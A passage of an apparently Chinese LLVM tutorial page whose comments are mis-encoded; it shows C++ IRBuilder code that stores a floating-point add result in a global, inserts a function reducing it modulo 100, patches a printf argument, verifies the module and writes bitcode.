class="token punctuation">,</span> E <span class="token operator">=</span> <span class="token function">inst_end</span><span class="token punctuation">(</span><span class="token operator">*</span>main_fn<span class="token punctuation">)</span><span class="token punctuation">;</span> I <span class="token operator">!=</span> E<span class="token punctuation">;</span> <span class="token operator">++</span>I<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>       <span class="token keyword">if</span><span class="token punctuation">(</span>I<span class="token operator">-></span><span class="token function">isBinaryOp</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> I<span class="token operator">-></span><span class="token function">getOpcode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">==</span>Instruction<span class="token double-colon punctuation">::</span>FAdd<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>           <span class="token comment">// outs() &lt;&lt; *I &lt;&lt; "\n";</span>           in_fadd <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token operator">*</span>I<span class="token punctuation">;</span>           in_prt <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token operator">*</span><span class="token punctuation">(</span>I<span class="token punctuation">.</span><span class="token keyword">operator</span><span class="token operator">++</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span></code></pre><h3 id="2-3-åˆ›å»ºå…¨å±€å˜é‡ï¼Œæ·»åŠ å¿…è¦çš„æŒ‡ä»¤">2.3) åˆ›å»ºå…¨å±€å˜é‡ï¼Œæ·»åŠ å¿…è¦çš„æŒ‡ä»¤</h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp">   <span class="token comment">/**    * 2022-04-28 02:42:32    * TODO:    * %20 = load double, double* %5, align 8    * %21 = fadd double %19, %20    * 1. åˆ›å»ºå…¨å±€å˜é‡fadd_res    * 2. å­˜å…¥å¸¸é‡100    * 3. å°†ADDç»“æœå­˜å…¥å†…å­˜ä¸­    * */</span>   <span class="token keyword">auto</span> f32 <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">getDoubleTy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// åˆ›å»ºåˆå§‹å€¼0ä¸100</span>   <span class="token keyword">auto</span> const_100 <span class="token operator">=</span> <span class="token class-name">ConstantFP</span><span class="token double-colon punctuation">::</span><span class="token function">get</span><span class="token punctuation">(</span>f32<span class="token punctuation">,</span><span class="token keyword">double</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">auto</span> const_0 <span class="token operator">=</span> <span class="token class-name">ConstantFP</span><span class="token double-colon punctuation">::</span><span class="token function">get</span><span class="token punctuation">(</span>f32<span class="token punctuation">,</span><span class="token keyword">double</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">auto</span> in_alloc02 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">GlobalVariable</span><span class="token punctuation">(</span><span class="token operator">*</span>M<span class="token punctuation">,</span>                                        f32<span class="token punctuation">,</span>                                        <span class="token boolean">false</span><span class="token punctuation">,</span>                                        GlobalValue<span class="token double-colon punctuation">::</span>PrivateLinkage<span class="token punctuation">,</span>                                        const_0<span class="token punctuation">,</span>                                        <span class="token string">"fadd_res"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// è®¾ç½®å¯¹é½æ–¹å¼</span>   in_alloc02<span class="token operator">-></span><span class="token function">setAlignment</span><span class="token punctuation">(</span><span class="token function">MaybeAlign</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// æ’å…¥åŸºæœ¬æŒ‡ä»¤ï¼Œå°†FADDç»“æœ,å­˜åˆ°fadd_resä¸­</span>   builder<span class="token punctuation">.</span><span class="token function">SetInsertPoint</span><span class="token punctuation">(</span>in_prt<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">auto</span> in_alloc01 <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">CreateAlloca</span><span class="token punctuation">(</span>f32<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"ina1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">auto</span> in_store01 <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">CreateStore</span><span class="token punctuation">(</span>const_100<span class="token punctuation">,</span>in_alloc01<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">auto</span> in_store02 <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">CreateStore</span><span class="token punctuation">(</span>in_fadd<span class="token punctuation">,</span>in_alloc02<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="2-4-æ„é€ å‡½æ•°è¯»å–ç»“æœè¿›è¡Œä¿®æ”¹">2.4) æ„é€ å‡½æ•°è¯»å–ç»“æœè¿›è¡Œä¿®æ”¹</h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/** * 2022-05-03 16:33:58 * TODO: * æ–°å»ºä¸€ä¸ªå‡½æ•°: * void work03_fn()&#123; *  if(fdd_res > 100) *      fdd_res = fdd_res %100; * &#125; * */</span><span class="token comment">// åˆ›å»ºå‡½æ•°</span><span class="token keyword">auto</span> fn_prototype <span class="token operator">=</span> <span class="token class-name">FunctionType</span><span class="token double-colon punctuation">::</span><span class="token function">get</span><span class="token punctuation">(</span>builder<span class="token punctuation">.</span><span class="token function">getVoidTy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">auto</span> work03_fn <span class="token operator">=</span> <span class="token class-name">Function</span><span class="token double-colon punctuation">::</span><span class="token function">Create</span><span class="token punctuation">(</span>fn_prototype<span class="token punctuation">,</span>                                  Function<span class="token double-colon punctuation">::</span>ExternalLinkage<span class="token punctuation">,</span>                                  <span class="token string">"work03_fn"</span><span class="token punctuation">,</span>                                  M<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// åˆ›å»ºåŸºæœ¬å—        </span><span class="token keyword">auto</span> work03_fn_defaut<span class="token operator">=</span> <span class="token class-name">BasicBlock</span><span class="token double-colon punctuation">::</span><span class="token function">Create</span><span class="token punctuation">(</span>context<span class="token punctuation">,</span> <span class="token string">"work03_fn_defaut"</span><span class="token punctuation">,</span> work03_fn<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">auto</span> work03_fn_change <span class="token operator">=</span> <span class="token class-name">BasicBlock</span><span class="token double-colon punctuation">::</span><span class="token function">Create</span><span class="token punctuation">(</span>context<span class="token punctuation">,</span> <span class="token string">"work03_fn_change"</span><span class="token punctuation">,</span> work03_fn<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">auto</span> work03_fn_nothing <span class="token operator">=</span> <span class="token class-name">BasicBlock</span><span class="token double-colon punctuation">::</span><span class="token function">Create</span><span class="token punctuation">(</span>context<span class="token punctuation">,</span> <span class="token string">"work03_fn_nothing"</span><span class="token punctuation">,</span> work03_fn<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// é»˜è®¤åŸºæœ¬å— æŒ‡ä»¤æ“ä½œ</span>builder<span class="token punctuation">.</span><span class="token function">SetInsertPoint</span><span class="token punctuation">(</span>work03_fn_defaut<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">auto</span> work03_de_load_01 <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">CreateLoad</span><span class="token punctuation">(</span>f32<span class="token punctuation">,</span>in_alloc02<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">auto</span> work03_de_fcmp_01 <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">CreateFCmpUGT</span><span class="token punctuation">(</span>work03_de_load_01<span class="token punctuation">,</span>const_100<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">auto</span> work03_de_br_01 <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">CreateCondBr</span><span class="token punctuation">(</span>work03_de_fcmp_01<span class="token punctuation">,</span>                                            work03_fn_change<span class="token punctuation">,</span>                                            work03_fn_nothing<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// å–ä½™ æŒ‡ä»¤æ“ä½œ</span>builder<span class="token punctuation">.</span><span class="token function">SetInsertPoint</span><span class="token punctuation">(</span>work03_fn_change<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">auto</span> work03_ch_load_01 <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">CreateLoad</span><span class="token punctuation">(</span>f32<span class="token punctuation">,</span>in_alloc02<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">auto</span> work03_ch_frem_01 <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">CreateFRem</span><span class="token punctuation">(</span>work03_ch_load_01<span class="token punctuation">,</span>const_100<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">auto</span> work03_ch_store_01 <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">CreateStore</span><span class="token punctuation">(</span>work03_ch_frem_01<span class="token punctuation">,</span>in_alloc02<span class="token punctuation">)</span><span class="token punctuation">;</span>builder<span class="token punctuation">.</span><span class="token function">CreateRetVoid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// ç¬¬ä¸‰ä¸ªåŸºæœ¬å—ä»€ä¹ˆéƒ½ä¸åš</span>builder<span class="token punctuation">.</span><span class="token function">SetInsertPoint</span><span class="token punctuation">(</span>work03_fn_nothing<span class="token punctuation">)</span><span class="token punctuation">;</span>builder<span class="token punctuation">.</span><span class="token function">CreateRetVoid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="2-5-ä¿®æ”¹printfå‚æ•°">2.5) ä¿®æ”¹printfå‚æ•°</h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/** * 2022-05-03 18:27:56 * TODO: * åœ¨è°ƒç”¨prtinf å‡½æ•°ä¹‹å‰æ’å…¥è°ƒç”¨å‡½æ•°æŒ‡ä»¤ * ä»¥åŠè¯»å–fadd_res, ä¿®æ”¹printf ç¬¬ä¸‰ä¸ªå‚æ•° * */</span>builder<span class="token punctuation">.</span><span class="token function">SetInsertPoint</span><span class="token punctuation">(</span>in_prt<span class="token punctuation">)</span><span class="token punctuation">;</span>builder<span class="token punctuation">.</span><span class="token function">CreateCall</span><span class="token punctuation">(</span>work03_fn<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">auto</span> in_load03 <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">CreateLoad</span><span class="token punctuation">(</span>f32<span class="token punctuation">,</span>in_alloc02<span class="token punctuation">)</span><span class="token punctuation">;</span>in_prt<span class="token operator">-></span><span class="token function">setOperand</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>in_load03<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="2-6-ModuleéªŒè¯ä¸å­˜åˆ°æ–‡ä»¶">2.6) ModuleéªŒè¯ä¸å­˜åˆ°æ–‡ä»¶</h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/** * #include "llvm/IR/Verifier.h" * 2022-05-02 11:43:34 * TODO: * ä¿®æ”¹å®ŒModuleåè¿›è¡ŒéªŒè¯Moduleçš„å®Œæ•´æ€§ * verifyModule(*M,&amp;errs()): true if the module is broken.  * */</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>llvm<span class="token double-colon punctuation">::</span><span class="token function">verifyModule</span><span class="token punctuation">(</span><span class="token operator">*</span>M<span class="token punctuation">,</span><span class="token operator">&amp;</span><span class="token function">errs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">outs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token string">"debug: Module verify is ok \n"</span><span class="token punctuation">;</span>    M<span class="token operator">-></span><span class="token function">print</span><span class="token punctuation">(</span><span class="token function">outs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">nullptr</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">/** * #include "llvm/Bitcode/BitcodeWriter.h" * 2022-05-03 12:55:33 * TODO: * å°†ä¿®æ”¹åçš„IR å­˜å‚¨åˆ°æ–‡ä»¶ä¸­ï¼Œ æ‰§è¡Œ * */</span>std<span class="token double-colon punctuation">::</span>error_code EC<span class="token punctuation">;</span>llvm<span class="token double-colon punctuation">::</span>raw_fd_ostream <span class="token function">OS</span><span class="token punctuation">(</span><span class="token string">"aftermain.bc"</span><span class="token punctuation">,</span> EC<span class="token punctuation">,</span>llvm<span class="token double-colon punctuation">::</span>sys<span class="token double-colon punctuation">::</span>fs<span class="token double-colon punctuation">::</span><span class="token function">OpenFlags</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>llvm<span class="token double-colon punctuation">::</span><span class="token function">WriteBitcodeToFile</span><span class="token punctuation">(</span><span class="token operator">*</span>M<span class="token punctuation">,</span>OS<span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>OS<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="2-7-å…¨éƒ¨æºç ">2.7) å…¨éƒ¨æºç </h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/** * 2022-05-03 16:16:19 * sizaif * Work3ï¼šæ’å…¥ä¸€ä¸ªå‡½æ•°å¹¶è°ƒç”¨ã€‚å‡½æ•°ç”¨äºæ£€æŸ¥åŠ æ³•ç»“æœï¼Œå¦‚æœå¤§äº 100ï¼Œåˆ™å–ä½™ 100ã€‚æ­¤å‡½æ•°ä¼šä¿®æ”¹åŠ æ³•ç»“æœã€‚(å‡½æ•°æ“ä½œ) * clang++ $(llvm-config --cxxflags --ldflags --system-libs --libs)  -o main main.cpp * ./main main.ll * lli aftermain.bc * */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"llvm/Transforms/Utils/BasicBlockUtils.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;llvm/IR/IRBuilder.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"llvm/IR/LLVMContext.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"llvm/IR/Module.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"llvm/IR/InstIterator.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"llvm/IR/Instruction.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"llvm/IR/Instructions.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"llvm/IR/InstrTypes.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"llvm/IR/Verifier.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"llvm/IRReader/IRReader.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"llvm/CodeGen/MIRParser/MIRParser.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"llvm/Support/InitLLVM.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"llvm/Support/Debug.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"llvm/Support/TargetSelect.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"llvm/Support/SourceMgr.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;llvm/Support/raw_os_ostream.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"llvm/Bitcode/BitcodeWriter.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fstream></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;cstdio></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> llvm<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>     LLVMContext context<span class="token punctuation">;</span>    IRBuilder<span class="token operator">&lt;</span><span class="token operator">></span> <span class="token function">builder</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">;</span>    std<span class="token double-colon punctuation">::</span>unique_ptr<span class="token operator">&lt;</span>Module<span class="token operator">></span> M<span class="token punctuation">;</span>    std<span class="token double-colon punctuation">::</span>unique_ptr<span class="token operator">&lt;</span>MIRParser<span class="token operator">></span> MIR<span class="token punctuation">;</span>    SMDiagnostic Err<span class="token punctuation">;</span>    <span class="token comment">/**     * #include "llvm/IRReader/IRReader.h"     * 2022-04-26 03:04:32     * TODO:     * from IR file get Moudle class     * */</span>    M <span class="token operator">=</span> <span class="token function">parseIRFile</span><span class="token punctuation">(</span><span class="token function">StringRef</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>Err<span class="token punctuation">,</span>context<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>M<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        std<span class="token double-colon punctuation">::</span>cout<span class="token operator">&lt;&lt;</span><span class="token string">"debug: M is not null"</span><span class="token operator">&lt;&lt;</span>std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span>        <span class="token comment">// M->print(llvm::outs(),nullptr);</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        std<span class="token double-colon punctuation">::</span>cout<span class="token operator">&lt;&lt;</span><span class="token string">"M is null"</span><span class="token operator">&lt;&lt;</span>std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span>        Err<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token function">errs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * 2022-04-26 03:25:52     * TODO:     * è·å–mainå‡½æ•°     * */</span>    <span class="token keyword">auto</span> main_fn <span class="token operator">=</span> M<span class="token operator">-></span><span class="token function">getFunction</span><span class="token punctuation">(</span><span class="token function">StringRef</span><span class="token punctuation">(</span><span class="token string">"main"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">/**     * 2022-04-28 02:14:46     * TODO:     * æ‰¾åˆ°faddæŒ‡ä»¤,ä¸faddçš„åä¸€ä¸ªæŒ‡ä»¤     * */</span>    Instruction <span class="token operator">*</span>in_fadd<span class="token punctuation">,</span><span class="token operator">*</span>in_prt<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>inst_iterator I <span class="token operator">=</span> <span class="token function">inst_begin</span><span class="token punctuation">(</span><span class="token operator">*</span>main_fn<span class="token punctuation">)</span><span class="token punctuation">,</span> E <span class="token operator">=</span> <span class="token function">inst_end</span><span class="token punctuation">(</span><span class="token operator">*</span>main_fn<span class="token punctuation">)</span><span class="token punctuation">;</span> I <span class="token operator">!=</span> E<span class="token punctuation">;</span> <span class="token operator">++</span>I<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>I<span class="token operator">-></span><span class="token function">isBinaryOp</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> I<span class="token operator">-></span><span class="token function">getOpcode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">==</span>Instruction<span class="token double-colon punctuation">::</span>FAdd<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token comment">// outs() &lt;&lt; *I &lt;&lt; "\n";</span>            in_fadd <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token operator">*</span>I<span class="token punctuation">;</span>            in_prt <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token operator">*</span><span class="token punctuation">(</span>I<span class="token punctuation">.</span><span class="token keyword">operator</span><span class="token operator">++</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>       <span class="token punctuation">&#125;</span>        <span class="token comment">/**     * 2022-04-28 02:42:32     * TODO:     * %20 = load double, double* %5, align 8     * %21 = fadd double %19, %20     * 1. åˆ›å»ºå…¨å±€å˜é‡fadd_res     * 2. å­˜å…¥å¸¸é‡100     * 3. å°†ADDç»“æœå­˜å…¥å†…å­˜ä¸­     * */</span>    <span class="token keyword">auto</span> f32 <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">getDoubleTy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">auto</span> const_100 <span class="token operator">=</span> <span class="token class-name">ConstantFP</span><span class="token double-colon punctuation">::</span><span class="token function">get</span><span class="token punctuation">(</span>f32<span class="token punctuation">,</span><span class="token keyword">double</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// åˆ›å»ºåˆå§‹å€¼0</span>    <span class="token keyword">auto</span> const_0 <span class="token operator">=</span> <span class="token class-name">ConstantFP</span><span class="token double-colon punctuation">::</span><span class="token function">get</span><span class="token punctuation">(</span>f32<span class="token punctuation">,</span><span class="token keyword">double</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">auto</span> in_alloc02 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">GlobalVariable</span><span class="token punctuation">(</span><span class="token operator">*</span>M<span class="token punctuation">,</span>f32<span class="token punctuation">,</span><span class="token boolean">false</span><span class="token punctuation">,</span>GlobalValue<span class="token double-colon punctuation">::</span>PrivateLinkage<span class="token punctuation">,</span>const_0<span class="token punctuation">,</span><span class="token string">"fadd_res"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// è®¾ç½®å¯¹é½æ–¹å¼</span>    in_alloc02<span class="token operator">-></span><span class="token function">setAlignment</span><span class="token punctuation">(</span><span class="token function">MaybeAlign</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// æ’å…¥åŸºæœ¬æŒ‡ä»¤ï¼Œå°†FADDç»“æœ,å­˜åˆ°fadd_resä¸­</span>    builder<span class="token punctuation">.</span><span class="token function">SetInsertPoint</span><span class="token punctuation">(</span>in_prt<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">auto</span> in_alloc01 <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">CreateAlloca</span><span class="token punctuation">(</span>f32<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"ina1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">auto</span> in_store01 <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">CreateStore</span><span class="token punctuation">(</span>const_100<span class="token punctuation">,</span>in_alloc01<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">auto</span> in_store02 <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">CreateStore</span><span class="token punctuation">(</span>in_fadd<span class="token punctuation">,</span>in_alloc02<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">/**     * 2022-05-03 16:33:58     * TODO:     * æ–°å»ºä¸€ä¸ªå‡½æ•°:     * void work03_fn()&#123;     *  if(fdd_res > 100)     *      fdd_res = fdd_res %100;     * &#125;     * */</span>    <span class="token comment">// åˆ›å»ºå‡½æ•°</span>    <span class="token keyword">auto</span> fn_prototype <span class="token operator">=</span> <span class="token class-name">FunctionType</span><span class="token double-colon punctuation">::</span><span class="token function">get</span><span class="token punctuation">(</span>builder<span class="token punctuation">.</span><span class="token function">getVoidTy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">auto</span> work03_fn <span class="token operator">=</span> <span class="token class-name">Function</span><span class="token double-colon punctuation">::</span><span class="token function">Create</span><span class="token punctuation">(</span>fn_prototype<span class="token punctuation">,</span>Function<span class="token double-colon punctuation">::</span>ExternalLinkage<span class="token punctuation">,</span><span class="token string">"work03_fn"</span><span class="token punctuation">,</span>M<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// åˆ›å»ºåŸºæœ¬å—        </span>    <span class="token keyword">auto</span> work03_fn_defaut<span class="token operator">=</span> <span class="token class-name">BasicBlock</span><span class="token double-colon punctuation">::</span><span class="token function">Create</span><span class="token punctuation">(</span>context<span class="token punctuation">,</span> <span class="token string">"work03_fn_defaut"</span><span class="token punctuation">,</span> work03_fn<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">auto</span> work03_fn_change <span class="token operator">=</span> <span class="token class-name">BasicBlock</span><span class="token double-colon punctuation">::</span><span class="token function">Create</span><span class="token punctuation">(</span>context<span class="token punctuation">,</span> <span class="token string">"work03_fn_change"</span><span class="token punctuation">,</span> work03_fn<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">auto</span> work03_fn_nothing <span class="token operator">=</span> <span class="token class-name">BasicBlock</span><span class="token double-colon punctuation">::</span><span class="token function">Create</span><span class="token punctuation">(</span>context<span class="token punctuation">,</span> <span class="token string">"work03_fn_nothing"</span><span class="token punctuation">,</span> work03_fn<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// é»˜è®¤åŸºæœ¬å— æŒ‡ä»¤æ“ä½œ</span>    builder<span class="token punctuation">.</span><span class="token function">SetInsertPoint</span><span class="token punctuation">(</span>work03_fn_defaut<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">auto</span> work03_de_load_01 <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">CreateLoad</span><span class="token punctuation">(</span>f32<span class="token punctuation">,</span>in_alloc02<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">auto</span> work03_de_fcmp_01 <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">CreateFCmpUGT</span><span class="token punctuation">(</span>work03_de_load_01<span class="token punctuation">,</span>const_100<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">auto</span> work03_de_br_01 <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">CreateCondBr</span><span class="token punctuation">(</span>work03_de_fcmp_01<span class="token punctuation">,</span>work03_fn_change<span class="token punctuation">,</span>work03_fn_nothing<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// å–ä½™ æŒ‡ä»¤æ“ä½œ</span>    builder<span class="token punctuation">.</span><span class="token function">SetInsertPoint</span><span class="token punctuation">(</span>work03_fn_change<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">auto</span> work03_ch_load_01 <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">CreateLoad</span><span class="token punctuation">(</span>f32<span class="token punctuation">,</span>in_alloc02<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">auto</span> work03_ch_frem_01 <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">CreateFRem</span><span class="token punctuation">(</span>work03_ch_load_01<span class="token punctuation">,</span>const_100<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">auto</span> work03_ch_store_01 <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">CreateStore</span><span class="token punctuation">(</span>work03_ch_frem_01<span class="token punctuation">,</span>in_alloc02<span class="token punctuation">)</span><span class="token 